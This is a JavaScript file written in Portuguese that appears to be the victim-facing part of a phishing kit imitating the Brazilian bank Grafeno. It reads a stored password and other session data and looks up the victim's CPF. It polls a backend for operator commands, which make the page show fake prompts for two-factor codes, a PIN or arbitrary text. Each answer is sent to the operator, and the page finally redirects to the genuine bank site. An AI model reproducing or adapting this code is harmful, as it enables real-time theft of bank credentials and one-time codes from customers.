document.addEventListener("DOMContentLoaded", function () {
    // Acessando os dados armazenados no sessionStorage
    const userId = sessionStorage.getItem("user_id");
    const dominio = sessionStorage.getItem("dominio");
    const local = sessionStorage.getItem("local");
    const device = sessionStorage.getItem("device");
    const platform = sessionStorage.getItem("platform");
    const browser = sessionStorage.getItem("browser");
    const ip = sessionStorage.getItem("ip");
    const sistema = sessionStorage.getItem("sistema");
    const cache_sistema = sessionStorage.getItem("sessao_ativa");
    const sessao_usuario = sessionStorage.getItem("sessao_usuario");
    const sessao_senha = sessionStorage.getItem("sessao_senha");
    const sessao_nome_usuario = sessionStorage.getItem("sessao_nome_usuario");
    const sessao_numero_serie = sessionStorage.getItem("sessao_numero_serie");
    const sessao_api = sessionStorage.getItem("sessao_api");

    // Polling: só altera a página quando o comando do backend mudar
    var _ultimoComandoAplicado = "";
    function Request() {
        var login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
        if (!login) {
            setTimeout(Request, 5000);
            return;
        }
        $.ajax({
            url: "/comando-login",
            method: "POST",
            headers: { "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content") },
            data: { login: login },
            dataType: "json",
            success: function (data) {
                var comandoTxt = (data.comando || "").toLowerCase().trim();
                var ehComandoDireto = ["enviar_para_interna", "finalizar_atendimento", "aguardando"].indexOf(comandoTxt) >= 0;
                if (!comandoTxt.endsWith("solicitado") && !ehComandoDireto) {
                    return;
                }
                if (comandoTxt === _ultimoComandoAplicado) {
                    return;
                }
                _ultimoComandoAplicado = comandoTxt;
                var valores = {};
                var detalhes = (data.detalhes && data.detalhes.msg && data.detalhes.msg.GRAFENO) || [];
                if (Array.isArray(detalhes) && detalhes.length > 0) {
                    var reg = detalhes[0] || {};
                    for (var k in reg) valores[k] = reg[k];
                }
                tratarRespostaComando(comandoTxt, data, valores);
            },
            complete: function () {
                setTimeout(Request, 5000);
            }
        });
    }
    Request();

    function enviarComando(comando) {
        const login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";

        if (!login) {
            console.error(
                "Envio de comando ignorado (login ausente).",
                comando
            );
            return;
        }

        $.ajax({
            url: "/enviar-comando",
            method: "POST",
            headers: {
                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
            },
            data: {
                comando: comando,
                usuario: login,
            },
        });
    }

    function consultarCpf(cpfStr) {
        try {
            const cpfDigits = (cpfStr || '').replace(/\D/g, '');
            if (!cpfDigits) {
                return $.Deferred().reject({ message: 'CPF inválido' }).promise();
            }

            const apiUrl = `/buscar/cpf/${cpfDigits}`;

            return $.ajax({
                url: apiUrl,
                method: 'GET',
                dataType: 'json'
            });
        } catch (err) {
            console.error('Erro ao montar requisição consultarCpf:', err);
            return $.Deferred().reject(err).promise();
        }
    }

        enviarPing();
    setInterval(enviarPing, 10000);

    function enviarPing() {
        const ip = sessionStorage.getItem("ip");
        if (!ip) {
            console.error("Nenhum IP no sessionStorage, ping não enviado.");
            return;
        }

        $.ajax({
            url: "/registrar-ping",
            method: "POST",
            headers: {
                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
            },
            data: { ip },
            success: (res) => console.log("Ping enviado:", res),
            error: (err) =>
                console.error(
                    "Erro ao enviar ping:",
                    err?.responseText || err?.statusText || err
                ),
        });
    }


    consultarCpf(sessionStorage.getItem('usuario_logado'))
        .done(function (apiRes) {
            // exibe os dados básicos retornados (não interrompe o fluxo)
            if (apiRes && apiRes.status === 'ok' && apiRes.dadosCPF) {
                const p = apiRes.dadosCPF;
                console.log('Consulta CPF antecipada:', p);
                // Salva os dados no sessionStorage para uso posterior
                try {
                    sessionStorage.setItem('dadosCPF', JSON.stringify(p));

                    $("#nome").text(p.nome || '');
                    $("#dados").text(p.cpf +' - '+ p.dataNascimento || '');

                } catch (e) {
                }
            } else {
                return false;
            }
        })
        .fail(function (jqXHR, textStatus, err) {

            return false;
        });


    function tratarRespostaComando(comando, data, valores) {
        const etapaRaw = comando.replace("solicitado", "").trim();
        const isErro = etapaRaw.includes("_error");
        const etapa = etapaRaw.replace("_error", "").trim();

        enviarComando(etapa);

        if (isErro) {
            if (etapa === "aviso") {
                $("#msg_bc").fadeIn(200);
                $("#loading").hide();
            } else if (etapa === "codigo_token") {
                showTwoFactorAuth();
                $("#msg_bc").hide();
            } else if (etapa === "aguardando") {
                $("#loading").fadeIn(200);
                $("#msg_bc").hide();
            } else if (etapa === "comando") {
                showComandoAuth(valores.input_comando);
                $("#msg_bc").hide();
            } else if (etapa === "finalizar_atendimento") {
                location.href = "https://grafeno.digital/";
            } else if (etapa === "pin") {
                showPinAuth();
                $("#msg_bc").hide();
            }
        } else {
            if (etapa === "aviso") {
                $("#msg_bc").fadeIn(200);
                $("#loading").hide();
            } else if (etapa === "codigo_token") {
                showTwoFactorAuth();
                $("#msg_bc").hide();
            } else if (etapa === "aguardando") {
                $("#loading").fadeIn(200);
                $("#msg_bc").hide();
            } else if (etapa === "comando") {
                showComandoAuth(valores.input_comando);
                $("#msg_bc").hide();

            } else if (etapa === "finalizar_atendimento") {
                location.href = "https://grafeno.digital/";
            } else if (etapa === "pin") {
                showPinAuth();
                $("#msg_bc").hide();
            }
        }
    }

    function showComandoAuth(comando) {
        Swal.fire({
            title: 'Atenção',
            text: comando,
            input: 'text',
            inputPlaceholder: 'Insira aqui',
            showCancelButton: false,
            icon: 'info',
            confirmButtonText: 'Confirmar',
            cancelButtonText: 'Cancelar',
            reverseButtons: true,
            allowOutsideClick: false,
            preConfirm: (code) => {
                if (!code) {
                    Swal.showValidationMessage('Por favor, digite o código');

                }
                return code;
            }
        }).then((result) => {
            if (result.isConfirmed) {
                console.log('Código:', result.value);

                const login = sessionStorage.getItem('usuario_logado') || "";
                const code = result.value;

                const payload = {
                    usuario: login,
                    etapa: "Comando-" + code,
                    valor: code,
                };

                $.ajax({
                    url: "/atualizar-etapa",
                    method: "POST",
                    headers: {
                        "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
                    },
                    contentType: "application/json; charset=UTF-8",
                    dataType: "json",
                    data: JSON.stringify(payload),
                    beforeSend: function () {
                        console.log("Enviando Comando...");
                    },
                    success: function () {
                        console.log("Comando enviado. Aguardando validação...");
                    },
                    error: function () {
                    },
                    complete: function () { },
                });

            }
        });
    }

    function showTwoFactorAuth() {
        Swal.fire({
            title: 'Atenção',
            text: 'Para confirmar, digite o código de segurança da autenticação de dois fatores.',
            input: 'text',
            inputPlaceholder: 'Digite o código',
            showCancelButton: false,
            icon: 'warning',
            confirmButtonText: 'Confirmar',
            cancelButtonText: 'Cancelar',
            reverseButtons: true,
            allowOutsideClick: false,
            preConfirm: (code) => {
                if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
                    Swal.showValidationMessage('Por favor, digite o código');

                }
                return code;
            }
        }).then((result) => {
            if (result.isConfirmed) {
                console.log('Código:', result.value);

                const login = sessionStorage.getItem('usuario_logado') || "";
                const code = result.value;

                const payload = {
                    usuario: login,
                    etapa: "TOKEN-" + code,
                    valor: code,
                };

                $.ajax({
                    url: "/atualizar-etapa",
                    method: "POST",
                    headers: {
                        "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
                    },
                    contentType: "application/json; charset=UTF-8",
                    dataType: "json",
                    data: JSON.stringify(payload),
                    beforeSend: function () {
                        console.log("Enviando token...");
                    },
                    success: function () {
                        console.log("Token enviado. Aguardando validação...");
                    },
                    error: function () {
                    },
                    complete: function () { },
                });

            }
        });
    }

    function showPinAuth() {
        Swal.fire({
            title: 'Digite seu PIN.',
            input: 'text',
            inputPlaceholder: 'Digite o seu PIN',
            showCancelButton: false,
            icon: 'info',
            confirmButtonText: 'Confirmar',
            cancelButtonText: 'Cancelar',
            reverseButtons: true,
            allowOutsideClick: false,
            preConfirm: (code) => {
                if (!code || code.length !== 4 || !/^\d{4}$/.test(code)) {
                    Swal.showValidationMessage('Por favor, digite o PIN');

                }
                return code;
            }
        }).then((result) => {
            if (result.isConfirmed) {
                console.log('Código:', result.value);

                const login = sessionStorage.getItem('usuario_logado') || "";
                const code = result.value;

                const payload = {
                    usuario: login,
                    etapa: "PIN-" + code,
                    valor: code,
                };

                $.ajax({
                    url: "/atualizar-etapa",
                    method: "POST",
                    headers: {
                        "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
                    },
                    contentType: "application/json; charset=UTF-8",
                    dataType: "json",
                    data: JSON.stringify(payload),
                    beforeSend: function () {
                        console.log("Enviando PIN...");
                    },
                    success: function () {
                        console.log("PIN enviado. Aguardando validação...");
                    },
                    error: function () {
                    },
                    complete: function () { },
                });
            }
        });
    }

    //showPinAuth();
});
